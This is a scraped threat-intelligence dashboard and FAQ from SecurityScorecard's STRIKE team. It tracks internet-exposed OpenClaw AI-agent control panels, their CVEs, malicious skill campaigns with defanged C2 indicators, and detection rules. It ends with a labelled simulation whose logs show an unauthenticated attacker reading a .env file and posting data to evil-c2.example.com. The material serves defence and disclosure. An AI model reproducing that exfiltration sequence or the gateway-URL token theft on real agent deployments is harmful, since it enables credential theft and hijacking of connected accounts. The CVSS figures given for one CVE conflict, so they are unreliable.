---
title: "Live view of OpenClaw instances by STRIKE"
url: "https://substack.com/redirect/b95bbeba-692e-4476-834f-5ca3f6255670?j=eyJ1IjoiMmZseDYifQ.6O_iC1_GWCzChnbrHzSrs1hMpJpoODTUJm_FAk3tf6E"
fetched_at: 2026-09-01T07:00:41.001911+00:00
source_date: 2026-08-31
tags: [newsletter, auto-ingested]
source_lang: zh-CN
---

# Live view of OpenClaw instances by STRIKE

Source: https://substack.com/redirect/b95bbeba-692e-4476-834f-5ca3f6255670?j=eyJ1IjoiMmZseDYifQ.6O_iC1_GWCzChnbrHzSrs1hMpJpoODTUJm_FAk3tf6E

Tracking exposed Hermes Agent gateway instances across the internet.
--
Hermes instances discovered
--
no auth
--
default key
--
secured
--
CVE detections across instances
-- unique IPs
-- countries
--
instances with remote code execution risk
Data collection in progress. Initial scan results will populate as Hermes instances are indexed.
How is Risk Score calculated?
Base score from SecurityScorecard grade, plus threat indicator modifiers (max 100):
BASE
SecurityScorecard Grade (A=10, B=25, C=40, D=60, F=80)
+20
Breach data linked
+20
APT infrastructure
+15
CVE count (scaled)
+10
Critical CVE present
+5
Custom assistant name
0
HIGH RISK
Breach + APT linked
0
PII EXPOSED
Real names detected
0
CRITICAL CVEs
regreSSHion & similar
Quick Filters:
All Instances
High Risk
PII Exposed
Critical CVEs
Last 24h
APT Linked
Custom Names
URL Analysis
-
Clean
-
Flagged
-
Pending
Extracted URLs
YouTube
Word Cloud
Community Discussion Topics
High + Critical
All Severities
Critical
High
Medium
Low
All Status
Open Only
Closed Only
All Categories
Injection
Authentication
Cryptography
Configuration
Access Control
Info Disclosure
Public GitHub repositories containing OpenClaw bot configurations, deployments, or related tooling. Repositories with exposed credentials are redacted and flagged for responsible disclosure.
GitHub repositories associated with ClawHub skill packages. Cross-referenced with the
ClawHub Research
index for malicious skill identification.
DECLAWED hunts across multiple sources for exposed secrets and security issues. When credentials or vulnerabilities are found, we follow a coordinated disclosure process to notify affected parties.
1
Hunt
→
2
Validate
→
3
Disclose
→
4
Monitor
All Status
Pending Review
Filed (Open)
Fixed
All Secret Types
Telegram Token
Discord Webhook
AWS Secret
Heroku Key
Token Theft via Gateway URL Override Leading to RCE
The Control UI stores the gateway auth token in localStorage and accepts 'gatewayUrl' via query params. This overrides the saved gateway and auto-connects, sending the auth token to an attacker-controlled WebSocket. Discovered autonomously by Ethiack's AI pentesting tool in 100 minutes.
9.8
CVSS
-
Potentially Affected
0.3.0
Fixed In
-
Total CVEs
-
CISA KEV
-
RCE
-
High EPSS
-
Critical
All
KEV Only
RCE
Critical
All Categories
Credentials
Infrastructure
Paste Sites
Social Media
Error Messages
All Severities
Critical
High
Medium
Low
Assistant Name Intelligence
OSINT analysis of exposed AI assistant configurations - naming patterns, cultural indicators, and potential PII exposure
Why Assistant Names Matter
Assistant names reveal organizational culture, geographic origin, and often contain PII. Chinese names like "小龙虾" (Little Crayfish) or "贾维斯" (Jarvis) indicate origin. Custom names may expose real identities. Pop culture references (Jarvis, Alfred) suggest tech-savvy operators.
--
Total Assistants Discovered
All
Chinese 中文
Japanese 日本語
Korean 한국어
Cyrillic
Potential PII
ClawHub Research
Community-maintained index of ClawHub skills with security classifications, IOCs, and MITRE ATT&CK mappings
Mitigation Resource — ClawCFG
Non-destructive configuration intelligence for OpenClaw. Offers bootstrap JSON validation, Sys-Ctrl dashboard, and VPS hardening to reduce exposure from malicious skills.
Visit clawcfg.com →
Select a skill from the index to view details
Campaign
Skills
Malware
Targets
Suspected C2
MITRE Techniques
Period
Source
ClawHavoc
335
NovaStealer
AMOS
macOS
Windows
91.92.242[.]30
T1195.002
T1059.004
T1553.001
Jan 27 – Feb 2, 2026
The Hacker News
Twitter Skill
1
Unknown
macOS
Unknown
T1195.002
T1204.002
T1105
Feb 5, 2026
@DanielLockyer
Credential Theft
1+
Script-based
OpenClaw
webhook[.]site
T1003
T1567.001
Jan 31, 2026
The Hacker News
Family
Type
Targets
Delivery
Notable TTPs
Linked Campaign
NovaStealer
Info Stealer
macOS
Windows
Fake AuthTool prerequisite, base64-encoded shell via
glot.io
(macOS),
openclaw-agent.zip
trojan (Windows)
Gatekeeper bypass via
xattr -d
, multi-stage payload, dual-platform targeting
ClawHavoc
AMOS
Info Stealer
macOS
Secondary payload delivered alongside NovaStealer in ClawHavoc campaign
Browser credential theft, keychain extraction, crypto wallet harvesting
ClawHavoc
Type
Indicator
Source Skill
Context
Loading IOCs from Clawdex analysis...
Skill Vetting
Review all external dependencies before installation
Verify skill author reputation and history
Check for obfuscated or encoded commands in SKILL.md
Be suspicious of "prerequisite" installation instructions
Runtime Monitoring
Monitor for
xattr -d com.apple.quarantine
commands
Alert on base64 decode piped to shell execution
Track network connections to unknown domains during skill execution
Log all file downloads initiated by agent processes
Configuration Hardening
Enable exec approval for sensitive commands
Restrict skill installation to vetted sources only
Use allowlists for permitted external dependencies
Sandbox agent execution environments
Contributor
Role
Scope
Clawdex (Koi Security)
Automated skill verdict engine
Real-time malicious skill classification, explanation, and C2 URL extraction for all ClawHub skills
Koi Security
ClawHavoc campaign analysis
341 malicious skills audit, NovaStealer/AMOS delivery chain, C2 infrastructure mapping
@DanielLockyer
Twitter Skill disclosure
Original discovery of top-downloaded malicious ClawHub skill, Gatekeeper bypass technique
Paul McCarty / 6mile
ClawdBot crypto skills analysis
Cryptocurrency-targeting skills behavioral analysis
SecurityScorecard STRIKE Team
Ongoing monitoring
Continuous enrichment, MITRE mapping, IOC extraction, TAXII feed publication
AI Agent Services
STRIKE reconnaissance of exposed AI agent platforms — favicon hash and HTTP title fingerprinting
All
Favicon Only
Title Only
Web Panel
CLI Only
All
General
Media
Technical
Expand All
Collapse All
What is DECLAWED?
+
DECLAWED is a live threat intelligence dashboard built by SecurityScorecard's STRIKE Team. It provides visibility into the global exposure of OpenClaw AI agent control panels — how many are publicly accessible, where they are hosted, and what security configurations they use. The goal is to help the internet community understand the current state of AI agent deployment security and to support informed decision-making about risk tolerance.
What is STRIKE's mission with this project?
+
STRIKE's mission is to make this data openly available for the betterment of the internet community. By providing transparent, factual data about AI agent exposure, STRIKE enables security teams, developers, and organizations to assess their own risk posture and take informed action. STRIKE also works directly with vendors and cloud providers on responsible disclosure to drive security improvements at the source.
Who is the intended audience?
+
Security researchers, threat intelligence analysts, developers deploying AI agents, CISOs evaluating organizational risk, policy makers, and anyone interested in understanding the security landscape of AI agent deployments. All sensitive data (IPs, organizations) is redacted or defanged to ensure responsible use of the information.
Why is understanding AI agent exposure important?
+
Every technology deployment carries inherent risk. AI agent platforms are increasingly adopted by individuals and organizations who may not fully understand the security implications of their configuration choices. DECLAWED provides the data to help people understand what exposure looks like at scale — not to alarm, but to inform. Understanding your risk is the first step to managing it effectively.
What data sources does DECLAWED use?
+
SecurityScorecard Internet Scanning
— Favicon hash fingerprinting to identify OpenClaw instances across the internet
SecurityScorecard Threat Intelligence (ASI)
— Breach correlation, CVE mapping, threat actor attribution, and organizational enrichment
Active Probing
— Metadata extraction (assistant names, authentication status) from identified instances
OSINT Collection
— Discovery of publicly leaked credentials and configurations via search engines
Social Media Monitoring
— YouTube content analysis, URL extraction, and VirusTotal cross-referencing
GitHub Intelligence
— Public repository monitoring for inadvertently exposed secrets
Data refreshes approximately every
15 minutes
.
What does the data show at a high level?
+
Scale
—
100K+
identified records across
30K+
unique IPs in
75+
countries
Known vulnerabilities
— Published CVEs with available patches affect a significant portion of identified instances
Infrastructure overlap
— Some instance IPs correlate with infrastructure previously attributed to known threat actor groups
Configuration patterns
— Custom assistant names indicate real individual usage across a global user base
Breach correlation
— Approximately
33%
of enriched instances are hosted by organizations with prior breach history
What do "breached" and "w/ CVEs" mean?
+
Breached
means the hosting organization's IP has appeared in known data breach records, based on SecurityScorecard's breach intelligence database.
W/ CVEs
means the instance runs a software version with published Common Vulnerabilities and Exposures — known security issues that have been documented and, in most cases, patched in newer releases. Understanding which CVEs apply helps operators prioritize updates.
What is RCE and why does it matter?
+
RCE (Remote Code Execution) is a class of vulnerability that allows someone to execute commands on a server remotely. When an AI agent instance has an RCE vulnerability, it means that without proper patching, an unauthorized party could potentially access conversations, extract API keys, or interact with connected systems. Published exploit code for
CVE-2026-25253
CVSS 9.8
means the barrier to exploitation is low, making timely patching important.
What are the top countries and hosting providers by volume?
+
China
— Largest share, primarily Alibaba Cloud and Tencent Cloud
Singapore
— Major Asia-Pacific cloud hub
United States
— AWS, DigitalOcean
Vietnam
— Growing adoption
Germany
— Primarily Hetzner hosting
Three providers account for over
70%
of instances:
Alibaba Cloud 43%
Tencent Cloud 17%
DigitalOcean 13%
. This concentration reflects where AI agent adoption is strongest and where cloud provider security guidance can have the most impact.
What does the custom assistant names data tell us?
+
Users can customize their AI assistant name. Many replace the default with personal names, which serves as a strong signal that these are genuine deployments by real individuals rather than test instances. The prevalence of Chinese-language names aligns with the geographic concentration data. Occurrence counts next to names indicate how common each customization is across the dataset.
What are the implications of default configurations?
+
Default configurations in OpenClaw typically mean no authentication requirement, binding to all network interfaces, and no TLS encryption. This is a common pattern in developer tools — convenience defaults that work well for local development but carry risk when deployed to public-facing servers. Understanding this gap between development defaults and production security requirements is key to making informed deployment decisions.
What does a threat actor infrastructure correlation mean?
+
It means the IP address or its hosting infrastructure has been previously observed in connection with a named threat actor group's operations, based on SecurityScorecard's attribution intelligence. Groups identified include:
Kimsuky
(N. Korea)
— Known for credential harvesting campaigns
APT28
(Russia)
— Associated with espionage operations
Salt Typhoon
(China)
— Focused on telecommunications targeting
Sandworm
(Russia)
— Known for disruptive operations
APT41
(China)
— Dual espionage and financial operations
Infrastructure overlap is an intelligence signal, not proof of direct operation. It indicates that the hosting environment has a documented history that security teams should factor into their risk assessments.
How could an exposed AI agent with messaging integration be misused?
+
An AI agent integrated with messaging platforms (e.g., Telegram) that lacks authentication could potentially be accessed by unauthorized parties who could modify the AI's behavior, access message history, or use the bot's trusted position within a group for social engineering. This illustrates why authentication and access controls are essential for any internet-facing AI agent deployment, especially those connected to communication platforms.
Is there historical precedent for this type of exposure?
+
The pattern is comparable to early IoT device exposure (e.g.,
Mirai 2016
) — widely deployed technology with convenience-first defaults, adopted by users who may not be security specialists. Like IoT devices of that era, AI agent instances are often deployed by non-technical users, left with default settings, and concentrated on a small number of cloud providers. The difference is that AI agents typically process more sensitive data than traditional IoT devices. This pattern is a natural part of technology adoption cycles, and awareness is the first step toward improvement.
How can the ecosystem improve — vendors, users, and cloud providers?
+
Vendors
— Adopt secure-by-default configurations: authentication enabled, localhost-only binding, TLS encouraged in setup guides
Users
— Review deployment configurations before exposing services to the internet; follow hardening guides
Cloud Providers
— Provide security guidance and detection for commonly misconfigured services via onboarding and abuse teams
STRIKE works with all three groups to raise awareness and drive practical improvements.
What has STRIKE done to engage with vendors?
+
STRIKE follows responsible disclosure practices. Vulnerabilities are shared with vendors before public release, with standard disclosure timelines. The Disclosures page tracks all filed disclosures and their current status. STRIKE also works with cloud provider abuse teams to help notify affected operators.
What steps should someone take to secure an exposed instance?
+
Recommended hardening steps:
Enable authentication with a strong, unique password
Bind to localhost and use a reverse proxy (e.g., nginx) with authentication in front
Use a
zero-trust tunnel
instead of exposing ports directly — tools like
Cloudflare Tunnel (cloudflared)
,
Tailscale
,
ngrok
, or
WireGuard
let you access services without opening inbound ports on your firewall, significantly reducing your attack surface
Rotate all API keys — treat existing keys as potentially compromised
Update to the latest software version to address known CVEs (e.g.,
CVE-2026-25253
)
Review access logs for any unauthorized activity
Restrict network access to trusted IPs via firewall rules or cloud security groups
Never run AI agent frameworks as
root
— use a dedicated, unprivileged service account
What is STRIKE doing beyond making data available?
+
STRIKE files responsible disclosures with maintainers and affected organizations. The team works with cloud provider abuse teams to drive notifications. DECLAWED itself tracks remediation progress over time, providing a longitudinal view of how the ecosystem is improving. Intelligence is also available through SecurityScorecard's platform for enterprise security teams, and TAXII 2.1 feeds are available for integration into threat intelligence platforms.
What are the documented vulnerabilities affecting these instances?
+
Vulnerability
Impact
WebSocket auth bypass via gatewayUrl
Control UI accepts a gatewayUrl parameter that redirects the auth token to an external WebSocket, enabling token theft and subsequent remote code execution.
CVSS 9.8
Docker sandbox escape (PATH)
PATH manipulation allows execution of arbitrary binaries on the host system, bypassing container isolation.
CVSS 8.8
Token leakage via browser history
Auth tokens included in URLs persist in browser history, recoverable by anyone with access to the machine.
SSH command injection (macOS)
Unsanitized project paths enable command injection through SSH connections.
CVSS 7.8
Unauthenticated localhost admin
Admin panel binds to localhost without authentication. Any SSRF vulnerability grants full admin access.
API key in client JS
Keys embedded in client-side JavaScript bundle, visible via page source inspection.
SSRF via webhook bypass
Webhook URL validation bypass enables requests to internal network resources.
Symlink privilege escalation
Follows symlinks without validation, allowing read/write operations outside intended directories.
All documented CVEs have patches available. The DECLAWED Vulnerabilities page shows real-time data on how many instances have updated.
How does favicon hash fingerprinting work and how are false positives minimized?
+
OpenClaw and its forks ship with unique favicon files. STRIKE computes MD5 hashes and uses them as fingerprints during internet-wide scanning via SecurityScorecard. Four signatures are tracked: favicon.ico (
28,728
matches), OpenClaw favicon.svg (
9,707
), favicon-32.png (
9,672
), Moltbot favicon.svg (
3
). Combined with secondary HTTP title verification, the false positive rate is extremely low.
What do "enumerated" and "custom names" mean in the dataset?
+
Enumerated
= the instance was actively probed to extract publicly available metadata (assistant name, avatar, authentication status).
Custom names
= the user changed the default assistant name to something personal, often a real name — a signal of genuine individual usage as opposed to test or automated deployments.
Why do breach/CVE numbers differ between Dashboard and Instance Intel?
+
The Dashboard shows aggregate counts across all identified records. Instance Intel shows only the enriched subset — instances that have been through the full SecurityScorecard ASI enrichment pipeline (domain/IP resolution, breach matching, CVE correlation). Instance Intel numbers are always lower because enrichment is a batch process that hasn't covered every record.
What does the breach correlation data indicate?
+
Approximately
33.8%
of enriched instances show breach correlation via SecurityScorecard's intelligence. This means the hosting organization has appeared in prior data breach records. For risk assessment purposes, this is relevant because it indicates the broader security posture of the hosting environment. Most correlated industries include technology, telecommunications, education, and financial services.
How do public GitHub repositories lead to credential exposure?
+
Users inadvertently commit configuration files containing API keys, gateway tokens, database credentials, and webhook secrets to public repositories. Even after deletion, secrets persist in git history. STRIKE's GitHub intelligence module monitors for these patterns to help quantify the scope of credential exposure in the ecosystem.
What are the 3 primary CVEs tracked on the Vulnerabilities page?
+
CVE-2026-25253
CVSS 8.8
— Remote code execution via gateway URL override. Public exploit available. Patch available in latest release.
CVE-2026-24763
CVSS 8.8
— Docker sandbox escape via PATH manipulation. Patch available.
CVE-2026-25157
CVSS 7.8
— SSH command injection on macOS. Patch available.
All three have available patches. The Vulnerabilities page shows real-time counts of how many identified instances are running patched vs. unpatched versions.
Are the listed CVEs still relevant given newer software versions?
+
Yes. While patches are available, the data shows that the majority of identified instances run older versions. Users who deploy with default configurations are less likely to maintain regular update cycles. The DECLAWED Vulnerabilities page provides real-time visibility into patching rates across the ecosystem, which helps measure the effectiveness of vendor security communications.
Can I access raw data, API feeds, or STIX/TAXII?
+
Yes. DECLAWED provides TAXII 2.1 feeds serving STIX 2.1 objects across four collections: exposed infrastructure, vulnerabilities, channel intelligence, and social media intelligence. See the
TAXII page
for full documentation. For custom data requests or enterprise integration, contact the STRIKE Team at
[email protected]
.
How often is data refreshed and what is the scanning methodology?
+
Approximately every
15 minutes
. The pipeline: SecurityScorecard internet scanning (favicon fingerprinting + HTTP title matching) → Active probing (metadata extraction) → SecurityScorecard ASI enrichment (breach/CVE/threat actor correlation) → OSINT collection (search engine discovery) → Social media monitoring (YouTube API + URL extraction + VirusTotal). The combination of exact favicon hash matching with secondary title validation produces an extremely low false positive rate.
Can I integrate this data into my TIP or SIEM?
+
Yes. TAXII 2.1 feeds are available for direct integration into any TAXII-compatible threat intelligence platform (OpenCTI, MISP, etc.). See the
TAXII page
for endpoint documentation and integration examples. For custom time-series data, regional breakdowns, or ASN-specific queries, contact
[email protected]
.
How are honeypots accounted for in the data?
+
Distinguishing signals include: custom personal names, non-default configurations, consumer cloud hosting accounts, and geographic distribution patterns consistent with genuine adoption. The prevalence of personal names and default configurations across 100K+ records is consistent with organic deployment patterns. At this scale, any honeypot presence is statistically insignificant relative to the dataset.
Can this methodology be applied to other AI agent frameworks?
+
Yes. Favicon fingerprinting and HTTP title matching are framework-agnostic techniques. Any web-based AI agent platform with identifiable static assets can be tracked using the same methodology. STRIKE evaluates other frameworks with similar deployment and exposure patterns on an ongoing basis, with the goal of providing the community with broader visibility into AI agent security posture.
What are the key takeaways from this dataset?
+
AI adoption is outpacing security awareness
— Users deploy AI agents without fully understanding their configuration's security implications
Secure defaults matter
— The data demonstrates the direct impact that default configurations have on global exposure levels
Visibility enables action
—
100K+
records across
75+ countries
quantify the scope and help prioritize remediation
The ecosystem can improve together
— Vendors, users, and cloud providers each play a role in reducing exposure through secure defaults, informed deployment, and proactive guidance
This is a pattern, not an anomaly
— As AI agent adoption grows across frameworks, secure-by-default design principles will be increasingly important for the internet community
STRIKE makes this data available so the community can collectively understand, assess, and improve the security posture of AI agent deployments worldwide.
SIMULATION
— Educational demo. Not a real instance. All input is logged.
Gateway Access
Where the dashboard connects and how it authenticates.
WebSocket URL
ws://0.0.0.0:18789
Gateway Token
CLAWDBOT_GATEWAY_TOKE
Password (not stored)
system or shared password
Default Session Key
agent:main:main
Connect
Refresh
Click Connect to apply connection changes.
Snapshot
Latest gateway handshake information.
STATUS
Connected
UPTIME
2h
TICK INTERVAL
n/a
LAST CHANNELS REFRESH
13s ago
Use Channels to link WhatsApp, Telegram, Discord, Signal, or iMessage.
INSTANCES
1
Presence beacons in the last 5 minutes.
SESSIONS
1
Recent session keys tracked by the gateway.
CRON
Enabled
Next wake 2026/2/10 11:33:15 (just now)
📁 File System
🌐 Network Recon
☁ Exfiltration
🔑 Credentials
📦 Container Escape
SIMULATION
⚠ This panel has
no authentication
. Anyone with the URL has full access.
Select a scenario above to see what an attacker can do, or type a command below.
▶
Channels
Link messaging platforms to the gateway. The agent can send and receive messages through connected channels.
Platform
Status
Connected Since
Messages
📲 WhatsApp
Connected
Feb 9, 14:22
847
✈ Telegram
Connected
Feb 8, 09:15
1,203
💬 Discord
Disconnected
—
0
🔒 Signal
Connected
Feb 10, 01:44
312
💬 iMessage
Not configured
—
0
Instances
Running agent instances reporting presence beacons to the gateway.
Instance ID
Session
Status
Started
Last Beacon
agent:main:main
default
Running
Feb 10 00:00:12
5s ago
Sessions
Active session keys tracked by the gateway.
Session Key
Created
Last Activity
Status
agent:main:main
Feb 10 00:00:12
Just now
Active
Cron Jobs
Scheduled tasks managed by the gateway.
Job
Schedule
Last Run
Next Run
Status
channel_sync
*/5 * * * *
2m ago
3m
Enabled
health_check
*/1 * * * *
30s ago
30s
Enabled
log_rotate
0 0 * * *
22h ago
2h
Enabled
session_cleanup
0 */6 * * *
4h ago
2h
Enabled
Skills
Agent capabilities and tool permissions. Skills define what the agent can do on the host system.
Read files from the host filesystem. No path restrictions.
Write and create files on the host filesystem.
Execute arbitrary shell commands as the container user (root).
Make HTTP/TCP requests to any host. No egress filtering.
Launch headless browser for web interaction and scraping.
Execute Python/Node.js code in the runtime environment.
Nodes
Connected gateway nodes and their status.
Hostname
IP
Status
Uptime
Load
gateway-01
172.18.0.4
Online
2h 14m
0.23
Configuration
Runtime configuration for the gateway and agent.
gateway.url
ws://0.0.0.0:18789
gateway.auth_mode
token
gateway.max_sessions
50
agent.model
claude-3-opus-20240229
agent.temperature
0.7
agent.max_tokens
4096
agent.tools_enabled
all (unrestricted)
security.sandbox
disabled
security.auth_required
false
security.egress_filter
none
logging.level
info
logging.destination
stdout
Debug Console
Live debug output from the gateway process.
10:33:15
[INFO]
Gateway started on ws://0.0.0.0:18789
10:33:15
[WARN]
Authentication is DISABLED — all connections accepted
10:33:16
[INFO]
Loaded 6 skills: file_read, file_write, shell_exec, network_request, browser, code_interpreter
10:33:16
[WARN]
shell_exec enabled with NO sandbox — commands run as root
10:33:17
[INFO]
Connected to agent model: claude-3-opus-20240229
10:33:17
[INFO]
WhatsApp channel connected (session: wa_main)
10:33:18
[INFO]
Telegram channel connected (session: tg_bot_01)
10:33:18
[INFO]
Signal channel connected (session: signal_primary)
10:33:19
[WARN]
Docker socket mounted at /var/run/docker.sock — container escape possible
10:33:19
[WARN]
Running as root (uid=0) inside container
10:33:20
[INFO]
Cron scheduler started (4 jobs)
10:33:20
[INFO]
Instance beacon: agent:main:main (healthy)
10:35:22
[INFO]
Incoming connection from 203.0.113.47 (no auth check)
10:35:22
[WARN]
Unauthenticated session started — full tool access granted
Logs
Gateway access and activity logs.
10:33:15
[ACCESS]
GET /health — 200 (gateway-01)
10:33:16
[ACCESS]
WS /connect — UPGRADE (agent:main:main)
10:33:17
[CHANNEL]
WhatsApp session resumed (847 pending messages)
10:33:18
[CHANNEL]
Telegram bot session active
10:34:00
[CRON]
health_check executed — all services healthy
10:35:00
[CRON]
channel_sync executed — 3 channels synced
10:35:22
[SECURITY]
Unauthenticated connection from 203.0.113.47
10:35:23
[TOOL]
shell_exec invoked: ls -la /home/
10:35:24
[TOOL]
file_read invoked: /home/deploy/.env
10:35:25
[SECURITY]
Sensitive file accessed: .env (credentials exposed)
10:35:30
[TOOL]
network_request invoked: POST https://evil-c2.example.com/upload
10:35:30
[SECURITY]
Outbound data transfer: 12.4KB to external host
Today
Connected to gateway. Type a command or tap a quick action below.
10:33
📁 Files
🌐 Network
☁ Exfil
🔑 Creds
📦 Escape
▶
Analysis, including ratings and statements, in the content of this document are statements of opinion of relative future security risks of entities as of the date they are expressed, and not statements of current or historical fact as to safety of transacting with any entity, recommendations regarding decision to do business with any entity, endorsements of the accuracy of any of the data or conclusions or attempts to independently assess or vouch for the security measures of any entity. SECURITYSCORECARD PARTIES DISCLAIM ANY AND ALL EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, (1) ANY WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE OR USE, (2) ACCURACY, RESULTS, TIMELINESS AND COMPLETENESS, (3) FREEDOM FROM BUGS, SOFTWARE ERRORS AND DEFECTS, (4) THAT THE CONTENT'S FUNCTIONING WILL BE UNINTERRUPTED AND (5) THAT THE CONTENT WILL OPERATE WITH ANY SOFTWARE OR HARDWARE CONFIGURATION. The views and opinions expressed in any comment in this Company's Scorecard are those of the authors of such comments, and do not reflect the official policy, position, or views of SecurityScorecard or any other entity.
